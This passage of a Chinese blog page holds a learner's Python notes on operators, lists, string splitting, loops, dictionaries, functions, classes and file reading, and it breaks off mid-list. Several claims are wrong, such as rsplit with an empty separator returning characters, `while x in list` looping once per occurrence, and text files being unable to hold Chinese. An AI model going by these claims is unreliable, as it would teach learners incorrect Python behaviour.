title="数和运算"></a>数和运算</h1><ol><li><strong>表示乘方，如2</strong>3&#x3D;2<em>2</em>2；4<strong>2&#x3D;4*4；5</strong>3&#x3D;5<em>5</em>5</li><li>python的运算法则和数学中一样</li><li>只要操作数中有浮点数，最终得到的数都是浮点数</li><li>数中加下划线，在python3.6及以上的版本中输出时会没有，如2000_2300_231,输出是20002300231</li><li>取余%和c++一样，break,continue 和c++一样</li><li>a^b:a和b是十进制的数据，将10进制数字转换为2进制数字进行异或运算，再转换10进制数字。两个数字大小不同的a，b进行异或时，高位保持不变，相同位进行异或。eg:0b1111110011^0b1111&#x3D;0b1111111100，0011^1111&#x3D;1100</li><li>&#x2F;&#x2F;向下取整，eg：5&#x2F;&#x2F;2&#x3D;2，-5&#x2F;&#x2F;2&#x3D;-3</li></ol><h1 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h1><ol><li>一个代码一行但赋值可以这样多个变量赋值：x,y,z&#x3D;1,2,3 一个位置对应一个数值</li></ol><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ol><li>注释：#用于注释</li><li>注释：还可以:”””注释内容”””，这种注释方法可以多行注释，类似于c++的&#x2F;* *&#x2F;</li><li>注释：可以将多行代码选中后，同时按 ctrl键+&#x2F;键，就可以同时注释多行代码</li><li>缩进：选中多行代码，按tab键就可以同时缩进4个字符的位置</li><li>左移：选中多行代码，按tab键+shift键，就可以同时左移4个字符的位置</li></ol><h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><ol><li>列表（数组）也是从0开始，初始赋值不用定义元素个数，使用中括号将元素括上，元素可以是字符串，字符，数字等，但是字符和字符串要加单引号。在索引时，数组除了第一个是从零开始，倒数第一个则是索引-1，倒数第二个是-2 以此类推。例如 m[-1],m[-3],m[0]。若使用列表之前，未曾有过赋值或调用，需要申明列表:列表名&#x3D;[]</li><li>在列表末尾添加元素（数组末尾）用append()。用法 变量名.append(元素或变量名)，括号中是添加的元素，字符串要加单引号</li><li>列表中插入元素用insert函数。用法：变量名.insert(位置a，元素)，若a&gt;0,则元素添加在a处，原先在位置a的元素以及后面的元素自动向后移动一位。若a&lt;0，则添加在位置a前面一个的位置，位置a和后面元素各向后移动一位。</li><li>删除列表中的元素，用del语句。用法 del 变量名[位置a]，删除的就是位置a的元素，然后后面的元素自动向前补齐。</li><li>弹出列表中的元素pop()函数。用法 变量名.pop(位置a)，位置a可要可不要，写了位置a，就弹出位置a的元素，不写位置a，一个空括号，则自动弹出最后一个元素。使用语句时，可以只有弹出语句，如 m.pop()；也可以在弹出时用一个变量将弹出的元素储存进去，如 n&#x3D;m.pop()。</li><li>根据值删去列表中的元素——remove()。用法 变量名.remove(具体的元素)。但只能删除第一次出现此值的元素。</li><li>永久排序(字母顺序和数字从小到大)——sort()。 用法 变量名.sort(),若要字母或数字反着排序，则变量名.sort(reverse&#x3D;True)</li><li>临时排序（字母顺序和数字从小到大）——sorted()，只是临时排序，此语句执行完，顺序还原不变。用法sorted(变量名)，在可以输出时使用，例如print(sorted(m))</li><li>永久反转列表元素顺序——reverse()。用法：变量名.reverse()</li><li>确定列表的长度（测的是元素个数）——len()。用法：m&#x3D;len(变量名)</li><li>列表的结构之一。列表名&#x3D;[循环主体 for循环 ],初始化。eg：a&#x3D;[m*m for m in range(6)]</li><li>a &#x3D; [[0 for i in range(5)] for i in range(33)]  #创建33行5列（a[33][5]）的二维数组</li><li>切片，将列表中的部分索引出来。</li><li>用法一： 列表名[位置a:位置s]，将位置a（包括位置a）到位置s（不包括位置s）的元素索引出来，相当于索引s-a个元素，和range()有点像如果a&#x3D;0，则m[0:2]&#x3D;m[:2]。如果要索引位置a到最后一个的元素，那么索引时，右索引的数字为元素个数，即最后一个元素位置加一，并且还可以表示为：列表名[位置a:]</li><li>用法二：列表名[位置a:位置s:步长d]，位置a到位置s（不包括s）每d个索引一个，例如d&#x3D;2时，每隔一个元素索引一次。切片也可用于for循环中，替代列表s</li><li>range()函数创建一系列的数。用法 range(x)&#x3D;range(0,x),range(x,y),range(x,y,z)，x，y，z是数字。range（x）是指生成从0到x（不包括x）的数字；range(x,y)是指生成从x到y（不包括y）的数字；range（x，y，z）是指生成从x到y（不包括y），步长为z的数字，即类似于for(int q&#x3D;x;q&lt;y;q&#x3D;q+z)中的q</li><li>list()函数可以将range()函数生成的一系列数字存入一个新建的列表。用法 ： m&#x3D;list(range(·····))</li><li>max(列表名)求列表最大值，min(列表名)求列表最小值，sum(列表名)求列表总和</li><li>复制列表：列表a&#x3D;列表s[:]只能这样，不能是列表a&#x3D;列表s，因为如果是这样，在后面对列表a或s的任意操作都会被视为是对同一个列表的操作并执行，最后的结果是无论怎么对列表a或列表s区别操作，列表a和列表s的列表都是一样的，且都为最近一次对列表a或列表s的操作后产生的新列表。</li><li>元组，初始化时其他都和列表一样，只不过括号是用圆括号（），元组建立后，其列表及其元素不可改变，也不可添加元素，但可以以初始化的格式进行重新赋值 eg：列表a&#x3D;(·····)。索引元素时，还是用中括号[],eg m[2]。</li><li>列表里可以装字典。</li><li>创建空列表：列表a&#x3D;[]。</li><li>list&#x3D;[1,2,3,4],list[::-1]&#x3D;[4,3,2,1]</li><li>list(字符串)：可以将字符串中的每一个字符存入列表中。</li><li>在Python中，如果您有一个字符的列表，您可以使用join()方法将列表中的每个字符拼接成一个字符串。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 假设您有一个字符的列表</span><br><span class="line">char_list = [&#x27;H&#x27;, &#x27;e&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;]</span><br><span class="line"></span><br><span class="line"># 使用空字符串作为分隔符，将列表中的字符拼接起来</span><br><span class="line">joined_string = &#x27;&#x27;.join(char_list)</span><br><span class="line"></span><br><span class="line"># 打印拼接后的字符串</span><br><span class="line">print(joined_string)</span><br><span class="line"></span><br><span class="line">#输出：Hello</span><br></pre></td></tr></table></figure><h1 id="split-函数和rsplit-函数："><a href="#split-函数和rsplit-函数：" class="headerlink" title="split()函数和rsplit()函数："></a>split()函数和rsplit()函数：</h1><h2 id="split函数"><a href="#split函数" class="headerlink" title="split函数"></a>split函数</h2><ol><li>在Python中，split() 函数是字符串对象的一个方法，它用于将字符串分割成多个子字符串，并返回一个列表。split() 函数可以接受一个或两个参数。</li><li>单个参数：当split()函数只接受一个参数时，这个参数指定了用作分隔符的字符串。split()方法会根据这个分隔符将字符串分割成多个部分，并返回一个包含这些部分的列表。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">text = &quot;Hello, World!&quot;  </span><br><span class="line">result = text.split(&quot;, &quot;)  </span><br><span class="line">print(result)  # 输出：[&#x27;Hello&#x27;, &#x27;World!&#x27;]</span><br></pre></td></tr></table></figure><ol start="3"><li>两个参数：当split()函数接受两个参数时，第一个参数仍然是指定分隔符的字符串，而第二个参数是一个可选参数，指定了最大分割次数（从左到右）。这意味着split()函数将最多执行指定的分割次数，然后返回结果列表。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">text = &quot;apple,orange,banana,grape&quot;  </span><br><span class="line">result = text.split(&quot;,&quot;, 2)  </span><br><span class="line">print(result)  # 输出：[&#x27;apple&#x27;, &#x27;orange&#x27;, &#x27;banana,grape&#x27;]</span><br></pre></td></tr></table></figure><ol start="4"><li>注意：<ol><li>如果分隔符在字符串中不存在，split()函数将返回包含整个原始字符串的列表。</li><li>split()函数不会改变原始字符串，而是返回一个新的列表。</li></ol></li></ol><h2 id="rsplit函数"><a href="#rsplit函数" class="headerlink" title="rsplit函数"></a>rsplit函数</h2><ol><li>在Python中，rsplit() 函数与 split() 函数类似，也是用于将字符串分割成多个子字符串，并返回一个列表。不过，rsplit() 是从字符串的末尾开始向前搜索分隔符来进行分割的。</li><li>单个参数：当rsplit()函数只接受一个参数时，这个参数指定了用作分隔符的字符串。rsplit() 方法会根据这个分隔符从字符串的末尾开始向前搜索，并将字符串分割成多个部分，然后返回一个包含这些部分的列表。（此时和split函数一样）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">text = &quot;apple,orange,banana,grape&quot;</span><br><span class="line">result = text.rsplit(&quot;,&quot;)</span><br><span class="line">print(result)  # 输出：[&#x27;apple&#x27;, &#x27;orange&#x27;, &#x27;banana&#x27;, &#x27;grape&#x27;]</span><br></pre></td></tr></table></figure><ol start="3"><li>两个参数：当rsplit()函数接受两个参数时，第一个参数仍然是指定分隔符的字符串，而第二个参数是一个可选参数（整数），指定了最大分割次数。这意味着 rsplit() 函数将从字符串的末尾开始，最多执行指定的分割次数，然后返回结果列表。（和split函数的区别）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">text = &quot;apple,orange,banana,grape&quot;  </span><br><span class="line">result = text.rsplit(&quot;,&quot;, 1)  </span><br><span class="line">print(result)  # 输出：[&#x27;apple,orange,banana&#x27;, &#x27;grape&#x27;]</span><br></pre></td></tr></table></figure><ol start="4"><li>注意：<ol><li>如果分隔符在字符串中不存在，rsplit() 函数将返回包含整个原始字符串的列表。</li><li>如果分隔符是空字符串，rsplit() 函数将把字符串中每个字符都当作分隔符，并返回一个包含所有单个字符的列表，但是是从字符串末尾开始向前构建的。</li><li>同样，rsplit() 函数不会改变原始字符串，而是返回一个新的列表。</li></ol></li></ol><h1 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h1><ol><li>for循环。用法 :</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for 变量a in 列表s（或range（））:</span><br><span class="line">   循环内容（必须缩进，才代表是循环主体，且要缩进相同格数）</span><br></pre></td></tr></table></figure><p>意义：循环从列表s中的第一个元素到最后一个元素，依次赋值给变量a，每赋一次值进入一次循环主体当下一行语句不缩进时，此语句就不再在for循环当中，列表s可以替换成range()函数，例如 for  变量a in range(6)。</p><ol start="2"><li>for循环还可以用在字典中，遍历字典中的键和值，格式和列表的相比有略微变化 用法：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for 变量1，变量2 in 字典a.items():   其中变量1存键名，变量2存值。</span><br><span class="line"></span><br><span class="line">for循环还可以只遍历字典的键：</span><br><span class="line">for 变量a in 字典s.keys():</span><br><span class="line">for 变量1 in 字典a:     默认的是只遍历字典的键</span><br></pre></td></tr></table></figure><h1 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h1><ol><li>if语句和c++基本一样，只是不需要圆括号将条件括起来，然后条件后面需要加冒号，再换行；else也要接冒号。条件中的并且’&amp;&amp;‘被替代为’and‘、或者’||’被替代为’or’，同样两个并列的条件也可以分别用括号括起来，使之更加清楚明了。</li><li>in 语句，检查某个元素是否在列表中(字符串同样适用)，可以用在if中，也可以用在print中，其他判断语句也是。用法：元素a(或变量a) in 列表s。判断是否是不在列表中，就用not in语句，使用时就和in语句一样：元素a not in 列表s。</li><li>if语句还多了一个if-elif-else语句，相当于if-else的else里面还有一个if-else，elif后面也可以接条件，然后加冒号。一个if语句中可以增加很多个elif，就相当于if的判断条件，不符合就执行下一条判断语句。elif后面不是最后一定要有else。</li><li>if语句可以用来判断列表是否为空，用法： if 列表a：。如果列表不为空，则为true，进行下一条语句；如果列表为空，则为false，不进行if里的语句，或进行else的语句。</li><li>判断此程序是否是作为主程序运行：if <strong>name</strong>&#x3D;&#x3D;’<strong>main</strong>‘:，如果是调用的其他py文件，则是false</li></ol><h1 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h1><ol><li>字典。类似于列表，只不过创建时使用{}。字典内储存有键值对，通过键来索引匹配的值。用法：字典名a&#x3D;{‘键名1’：元素1，‘键名2’：元素2·····} 元素如果是字符串，则加单引号；如果是数字，则直接写，什么都不加。索引时：字典名[‘键名‘]，同样因为键名是字符串，所以要加单引号。注意：因为键名是字符串，所以无论何时要记得加单引号。</li><li>添加键值对。语句：字典a[‘键名1’]&#x3D;元素1。即可添加键值对。</li><li>可以创建空字典：字典a&#x3D;{}。在后续根据需要再添加键值对。</li><li>修改字典中的值，和添加键值对类似，直接赋值即可。</li><li>删除字典中的键值对。同样用del语句，和删除列表中的元素的方法类似，方法：del 字典a[‘键名’]。同样，删除后，后面的自动向前补齐。</li><li>字典中同样可以装列表，可以直接以列表的形式装进去，也可以以变量的形式装进去。eg：字典a&#x3D;{‘键名1’：[····]，‘键名2’：列表名s，····}。也可以字典中套字典。使用和c++的二维数组类似</li><li>get()语句。用法：变量s&#x3D;字典a.get(‘键名1’，返回的内容d)。若没有键名1，则返回d。d可以为字符串，也可以为数字，若为字符串则要加单引号。若字典中有键1，则变量s&#x3D;键1的值；若字典中没有键1，则变量s&#x3D;内容d。内容d也可以选择不要，则语句是：变量s&#x3D;字典a.get(‘键名1’)，此时如果不存在键1，则返回None给变量s。</li><li>字典a.keys()代表的是键；字典a.values()代表的是值；字典a.items()代表的是键值对。</li><li>sorted还可以用在字典上，用法和列表类似，用法：sorted(字典a.keys())，排序是仅对键排序，如果是print(sorted(字典a.keys()))，则只输出键排序后的结果，不包含值。同样也可以对字典a.items()排序，只不过排序结果和.keys()差不多，都是对键排序，但是.items()比.keys()多了值，输出时排序结果有值。同样也可以对字典a.values()排序，结果是对值的排序结果，只输出值的排序。</li><li>去重可以用set。用法：set(变量a)。不管是set(字典a)还是set(字典a.values())，.keys()和.items()都是根据键去重。变量a既可以是字典，也可以是列表，作用都是去重。字典的去重是多个重复的键，出去前面重复的键，保留最后一个。</li><li>对字典键值对按值排序，输出结果为键值对（格式：每一个键值对存放在元组中，元组存放在列表中）：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 按值(value)从大到小排序，my_dict：字典名，reverse=True：从大到小排序</span><br><span class="line">sorted_items_desc = sorted(my_dict.items(), key=lambda item: item[1], reverse=True)</span><br></pre></td></tr></table></figure><ol start="12"><li>判断字典中是否有这个健</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#用于检查变量 i 是否是字典 private_fre 中的一个键（key）。</span><br><span class="line">#如果 i 是字典中的一个键，那么 if 语句后面的代码块将会执行。</span><br><span class="line"></span><br><span class="line">if i in private_fre:</span><br></pre></td></tr></table></figure><h1 id="复杂语句"><a href="#复杂语句" class="headerlink" title="复杂语句"></a>复杂语句</h1><ol><li>缩进相同列数，相当于c++中在同一个花括号内，属于同一条复杂语句。</li></ol><h1 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h1><ol><li>input函数。用法：m&#x3D;input(“提示语句”),提示语句可以不要。读入整行</li><li>用input输入，python自动将它归类为字符串。</li><li>print()，可以同时输出多个元素，中间用空格隔开：print(元素1,元素2,元素3,元素4,····)</li><li>end语句用于print中：print(···，end &#x3D; ···)表示该语句的结尾是什么，如果不加end语句，print默认的是end &#x3D; ‘\n’,所以每次print语句输出完后会换行</li></ol><h1 id="pycharm下载库"><a href="#pycharm下载库" class="headerlink" title="pycharm下载库"></a>pycharm下载库</h1><ol><li>pycharm添加外部库方法：通过cmd命令提示符，输入pip install 库名,再按回车即可。还可以在pycharm的settings里的project的interpreter里package右边的加号点击搜索即可。</li><li>提高库的下载速度：pip install 库名 -i 网址（镜像源）</li><li>下载库时，如果报错：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR: Cannot uninstall &#x27;llvmlite&#x27;. It is a distutils installed project and thus we cannot accurately determine which files belong to it which would lead to only a partial uninstall.</span><br></pre></td></tr></table></figure><p>直接在anacoda里面的Lib文件夹的site-packages的文件夹内，将无法删除的库手动删除即可(除了库名对应的文件夹以外，还有该库的info文件，或含有该库名的其他文件)。</p><h1 id="int"><a href="#int" class="headerlink" title="int()"></a>int()</h1><ol><li>int()函数.用法int(字符型变量)将可以将字符型变量变为整型，和c++不同的是，它是将字符型的数字直接变成整型，数字不变，而不是将其转换为ASCII值。例如：字符型‘12’用int()可以变成12。int()函数可以用在input函数后，因为input()函数输入的内容自动识别为字符型。(input函数是读取整行)</li><li>int()函数值能对由数字组成的字符串使用，eg：’12345’等。不能对其他字符组成的字符串使用，eg：’asdf’等。</li><li>int()函数还可以对十进制数字使用，无论数字a是多少，都只会保留数字a的整数部分。</li></ol><h1 id="while"><a href="#while" class="headerlink" title="while"></a>while</h1><ol><li>while语句。用法：while 条件 ：</li><li>while True ：  会一直循环</li><li>while 元素a in 列表s ：意思元素a在列表s中有n个，while重复循环n次</li></ol><h1 id="创建函数"><a href="#创建函数" class="headerlink" title="创建函数"></a>创建函数</h1><ol><li>定义函数：def 函数名（）：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def 函数名（）：</span><br><span class="line">    &quot;&quot;&quot;····（解释说明函数的作用）&quot;&quot;&quot;(这行可要可不要)</span><br><span class="line">    函数内的语句</span><br></pre></td></tr></table></figure><ol start="2"><li>向函数传递信息：函数a（元素s）元素s就是向函数a传递的信息，可以在函数内使用，和c++类似，元素s是形参。括号内可以有多个形参，用逗号隔开：函数a（元素1，元素2，···）</li><li>在给函数传递值时，可以将名称和值联系起来：函数a（形参1&#x3D;元素1，形参3&#x3D;元素3，····）</li><li>函数默认值：在定义函数时，就可以在函数的（）中给形参赋值：def 函数a（形参1&#x3D;元素1，····）。在后续调用函数时，就可以不用再给该形参赋值。如果在后续调用函数时，又给该形参赋值，那么该形参的值是后续赋值所给的值。</li><li>返回值用return语句，和c++类似，返回的值在调用函数的代码行。</li><li>return可以返回多个值，但是用小括号将之括在一起，eg:return (元素a，元素s)。调用函数，并储存韩式返回值时，应当：(元素1，元素2)&#x3D;函数a(····)</li><li>调用函数时，直接传递列表，函数可以直接修改列表。若调用了列表，则在整个代码中的原列表的值也会随之改变。</li><li>若想要禁止函数修改列表，则可以采取将列表副本传递给函数的方法，调用函数时：函数a(列表s[:])</li><li>传递任意数量的实参，储存在形参列表中。在定义函数时：def 函数a(<em>元素1)。此时形参元素1是空元组，且在调用函数a时，可以传递无数实参，eg：函数a(元素1，元素2，元素3，···)在调用元素1时，就是写元素1，不加星号（</em>）。若还有其他形参，必须将*元素1放在最后。</li><li>传递任意数量的实参，储存在形参字典中。定义函数时：def 函数a(**元素1).此时元素1是空字典。在调用函数时，输入任意多个键和值的方法是：函数a(···,键名a&#x3D;元素1，键名s&#x3D;元素2)，此时键名不用加单引号，同样，还有多个其他形参时，此形参放在最后的位置。但在此时键名不能只是数字（键名a，键名s····）</li><li>将函数储存在模块中：创建一个函数d，将之保存在文件a中，在文件s中如果要调用函数a，则：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import 文件a(名字)</span><br><span class="line">文件a.函数d(····)</span><br></pre></td></tr></table></figure><ol start="12"><li>导入储存在模块（文件a）中的函数：from 文件a import 函数s。此时在后续代码中若要调用函数，则可以直接使用。可以同时导入多个函数：from 文件a import 函数s1，函数s2，函数s3···</li><li>使用as给函数指定别名：from 文件a import 函数s as 函数名s2——在此文件中函数s改名函数s2</li><li>使用as给模块（文件）指定别名：import 文件a as 文件名a1——在此文件中文件a改名文件a1</li><li>导入模块中的所有函数：from 文件a import *</li><li>在 Python 中，全局变量（global variables）是在模块（通常指的是一个文件）级别定义的变量，它们可以在整个模块中访问。然而，函数内部默认情况下不能直接修改全局变量的值。但是有一些特殊情况下，你可以在函数内部修改全局变量的值：</li><li>可变类型的全局变量：如果全局变量是一个可变类型（例如列表、字典、集合等），你可以在函数内部修改它的内容，而不需要使用 global 关键字。（哪怕只是修改函数中形参的值，也会导致传递值的实参的数值改变）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">def a(s):</span><br><span class="line">    s[1] = 0</span><br><span class="line">    print(s)</span><br><span class="line"></span><br><span class="line">s = [1,2,3]</span><br><span class="line">a(s)</span><br><span class="line">print(s)</span><br><span class="line">输出：</span><br><span class="line">[1, 0, 3]</span><br><span class="line">[1, 0, 3]</span><br><span class="line"></span><br><span class="line">def a(d):</span><br><span class="line">    d[1] = 0</span><br><span class="line">    print(d)</span><br><span class="line"></span><br><span class="line">s = [1,2,3]</span><br><span class="line">a(s)</span><br><span class="line">print(s)</span><br><span class="line">输出：</span><br><span class="line">[1, 0, 3]</span><br><span class="line">[1, 0, 3]</span><br></pre></td></tr></table></figure><pre><code>  1. 要让函数内的d的改变不影响外部的列表a，您可以在函数内部创建d的副本。这样，对副本的任何修改都不会影响原始列表。您可以使用列表的copy()方法或者切片操作[:]来创建副本。</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def s(d):</span><br><span class="line">    d = d.copy()</span><br><span class="line">    d.pop()</span><br><span class="line">    print(d)</span><br><span class="line"></span><br><span class="line">a = [1,2,3]</span><br><span class="line">s(a)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">[1, 2]</span><br><span class="line">[1, 2, 3]</span><br></pre></td></tr></table></figure><pre><code>  2. 不可变类型的全局变量：对于不可变类型（例如整数、字符串、元组等），你不能直接在函数内部修改其值。如果你尝试修改，Python 会创建一个新的局部变量，而不是修改全局变量。     1. 使用 global 关键字：如果你在函数内部想要修改一个全局变量的值，你可以使用 global 关键字来声明该变量是全局变量。这样，你就可以在函数内部修改它了。</code></pre><h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><ol><li>创建类：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class 类名：   #类名首字母最好大写以示和函数区别,作用和c++类似</span><br><span class="line">    def __init__(self,元素1，元素2，元素3，···)：#元素1，元素2，元素3和函数的形参类似</span><br><span class="line">        self.元素名a=元素1                     #同样可以给元素1，元素2··设值默认值</span><br><span class="line">        self.元素名s=元素2</span><br><span class="line">        self.元素名d=元素3  #一般元素a、s、d会和元素1、2、3名字相同</span><br><span class="line">        ····               #self.元素名 才是类的变量，叫属性。形参元素1、2、3···只是用</span><br><span class="line">                           #于赋值，所以定义属性的数量和形参的数量无关</span><br><span class="line">def 函数名(self):       # 类里面创建函数（可以创建也可以不创建）</span><br><span class="line">   ····                #类里面创建的函数和一般的函数类似，也可以以又return语句</span><br><span class="line"></span><br><span class="line">变量a=类名(元素1，元素2，元素3，···)  #此处和函数类似，给形参元素1，元素2，元素3赋值</span><br><span class="line">                             #此语句叫创建实例，可以创建多个实例，后续调用此类时：a.元素名a；a.元素名s；a元素名d,·····。</span><br></pre></td></tr></table></figure><ol start="2"><li>调用类里面的函数时，如果定义函数时括号内只有self，则是：变量a.函数名（），（）是空括号，实参在创建实例的时候就输入了，若定义函数时括号内除了self还有形参，则调用函数时括号内有实参。类中的函数又称为方法</li><li>在创建类的时候给属性赋默认值：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def __init__(self,元素1，元素2，元素3，···)：</span><br><span class="line">     self.元素名a=元素1</span><br><span class="line">     self.元素名s=值1  #赋予属性默认值</span><br><span class="line">     self.元素名d=元素2</span><br><span class="line">     ···</span><br></pre></td></tr></table></figure><ol start="4"><li>修改属性值：可以在创建实例后，可以直接修改属性的值：变量a.元素名a&#x3D;某元素或某值；也可以在创建类的代码中修改，比如在定义函数的代码中。</li><li>创建子类，子类将继承所有父类的方法和属性写法：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class 子类名(父类名)：</span><br><span class="line">    def __init__(self,元素名1，元素名2，元素名3···)：</span><br><span class="line">    super().__init__(元素名1，元素名2，元素名3···)</span><br></pre></td></tr></table></figure><p>父类必须在子类前面，此时属性和方法都会继承的子类中,此时元素名1，元素名2，元素名3    的 ···不用和父类形参名相同.在继承父类后，同样可以添加属性和方法，属性就在super（）下一行，方法就是正常添加</p><ol start="6"><li>在继承父类的子类中，如果出现和父类相同的方法名，则会忽略父类的方法，使用子类的方法。</li><li>实例也可以作为其他类的属性：self.元素名1&#x3D;类a()，后续使用就将其（变量a.元素名1）当作一个整体，看成类a来使用。</li></ol><h1 id="文本"><a href="#文本" class="headerlink" title="文本"></a>文本</h1><ol><li>读文件：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;文件名.txt&#x27;</span>) <span class="keyword">as</span> 变量名<span class="number">1</span>：</span><br><span class="line">     变量a=变量名<span class="number">1.</span>read()</span><br></pre></td></tr></table></figure><p>  此时变量a中储存文件中的所有内容（可以是n行的内容，n&gt;1），文件中内容不能包含中文</p><ol start="2"><li>以字节的形式读文件：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;C:/Users/上善若水/Desktop/cipher.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> p:</span><br><span class="line">    c = bytes_to_long(p.read())</span><br></pre></td></tr></table></figure><p>代码中的open函数以二进制读取模式（“rb”）打开文件，这意味着文件将会按照字节的形式被读取，而不会尝试按照任何特定的编码来解释这些字节。这通常用于读取非文本文件，如图像、音频、视频或任何其他二进制格式的文件。</p><ol start="3"><li>读取在文件夹内的文件：with open(‘文件夹名&#x2F;文件名.txt’) as 变量名1：  即可</li><li>读取文件夹或文件时，不管是文件夹还是文件，都必须和python源代码在同一个文件夹中才行。</li><li>还可以进行绝对路径的引用：open(‘·····’)，单引号中间的内容是绝对路径——文件在电脑中显示的路径+&#x2F;+文件名。eg:C:\Users\上善若水\Desktop\python\read,但是在引用时，我们一个当把其中的’&#39;变成’&#x2F;‘才行。</li><li>还可以将路径赋值给变量，再引用变量：变量1&#x3D;’···’,with open(变量1) as 变量2：</li><li>读取文件时，会将改行的换行符读取，所以想要输出时不换行，则使用函数.rstrip()</li><li>逐行读取文件：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&#x27;···&#x27;) as  变量1:</span><br><span class="line">     for 变量2 in 变量1：</span><br></pre></td></tr></table></figure><p>  变量2中储存了每一行的内容</p><ol start="9"><li>readlines()函数：将文件中读取的内容以列表的形式读取出来，每行为一个元素。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&#x27;····&#x27;) as 变量1：</span><br><span class="line">    列表1=变量1.readlines()</span><br></pre></td></tr></table></figure><ol start="10"><li>创建新的文本，并输入内容：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">with open(&#x27;新文本的路径（包括新文本的名字）&#x27;，&#x27;w&#x27;) as 变量a：</span><br><span class="line">    a.write(&#x27;要输入的内容&#x27;)</span><br><span class="line"></span><br><span class="line">#eg：&#x27;/path/to/your/file.txt&#x27;（文件路径）</span><br></pre></td></tr></table></figure><p>  如果再一个已创建的文本中输入，则文本中原先的内容都会清空，又输入的内容代替</p><ol 